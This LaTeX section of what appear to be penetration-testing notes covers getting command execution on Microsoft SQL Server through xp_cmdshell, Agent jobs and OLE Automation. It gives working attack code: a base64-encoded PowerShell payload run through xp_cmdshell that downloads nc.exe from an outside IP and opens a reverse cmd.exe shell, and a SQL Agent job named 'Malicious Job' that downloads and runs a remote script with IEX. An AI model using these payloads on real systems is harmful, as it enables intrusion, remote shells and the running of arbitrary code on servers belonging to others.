\section{Command execution}


There are several methods to get command execution:
\begin{itemize}
    \item  \verb+xp_cmdshell+ 
    \item  adding
        \href{https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server}{extended
        stored procedures}, 
    \item
        \href{https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration}{CLR
        Assemblies}
    \item
        \href{https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15}{SQL Server Agent Jobs}
    \item
        \href{https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql}{external
        scripts}
\end{itemize}

With the appropriate privileges, SQL database can be used to execute system
commands or create the necessary elements to do it.

\subsection{xp\_cmdshell}
MSSQL has a
\href{https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15}{extended
stored procedures} called
\href{https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15}{xp\_cmdshell}
which allow us to execute system commands using SQL. \verb+xp_cmdshell+:
\begin{itemize}
        \item is a powerful feature and disabled by default. It can be enabled
            and disabled by using the
            \href{https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration}{Policy-Based
            Management} or by executing
            \href{https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option}{sp\_configure}
        \item spawn a  Windows process that  has the same security rights as the
            SQL Server service account
        \item  operates synchronously. Control is not returned to the caller until the command-shell command is completed
\end{itemize}



To enable \verb+xp_cmdshell+ in \href{https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/server-configuration-options-sql-server?view=sql-server-ver16}{advanced server configuration options} user must have \verb+sysadmin+ role:
\begin{verbatim}
IS_SRVROLEMEMBER('sysadmin');
\end{verbatim}


To enable \verb+xp_cmdshell+ with \verb+sp_configure+
\begin{verbatim}
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO
-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO
\end{verbatim}

to launch a command:
\begin{verbatim}
xp_cmdshell 'whoami'
GO
\end{verbatim}


\begin{verbatim}
python3 -c \
'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

exec xp_cmdshell 'powershell -exec bypass -enc BASE64_ENC
\end{verbatim}


\subsection{MSSQL Server Agent Job}



\begin{verbatim}
USE msdb;  
GO

EXEC sp_add_job  
    @job_name = N'Malicious Job';
GO

EXEC sp_add_jobstep  
    @job_name = N'Malicious Job',
    @step_name = N'Execute PowerShell Script',
    @subsystem = N'PowerShell',
    @command = N'(New-Object Net.WebClient).DownloadString("http://10.10.14.104/a")|IEX;',
    @retry_attempts = 5,
    @retry_interval = 5;
GO

EXEC sp_add_jobserver  
    @job_name = N'Malicious Job';
GO

EXEC sp_start_job
    @job_name = N'Malicious Job';
GO
\end{verbatim}



\subsection{OLE Automation Stored Procedure}

\href{https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/ole-automation-stored-procedures-transact-sql?view=sql-server-ver16}{OLE Automation stored procedure}


\begin{verbatim}
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;    
EXEC sp_configure 'ole automation procedures', 1;
RECONFIGURE;    
\end{verbatim}


\begin{verbatim}
DECLARE @objShell INT;
DECLARE @output varchar(8000);
    
EXEC @output = sp_OACreate 'wscript.shell', @objShell Output;
EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';    
\end{verbatim}

